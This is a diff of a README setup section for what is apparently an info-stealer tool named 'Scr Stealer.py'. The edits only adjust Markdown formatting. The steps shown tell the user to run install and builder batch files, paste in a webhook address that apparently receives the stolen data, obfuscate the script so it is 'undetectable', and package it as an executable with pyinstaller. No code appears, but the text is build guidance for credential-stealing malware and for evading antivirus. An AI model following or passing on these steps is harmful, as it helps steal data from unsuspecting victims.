@@ -20,12 +20,13 @@
 
                                                       ⬇️ Setup (Auto)
                                                       
-- 1.Step | **first open `install.bat`
-- 2.Step | **open `builder.bat`
+- 1.Step | **first open `install.bat`**
+- 2.Step | **open `builder.bat`**
                                         
                                                       ⬇️ Setup (Manual)
 
 - 1.Step | **Paste and save your webhook address instead of `"Intégration webhook a mettre ici :"` in Scr Stealer.py**
+
 - 2.Step | **If you use obfuscator it will be undetectable.**
 - 3.Step | **if you have an error while installing try `pip install -r requirements.txt`**
 - 4.Step | **Now You need to use pyinstaller to convert python file to exe.**
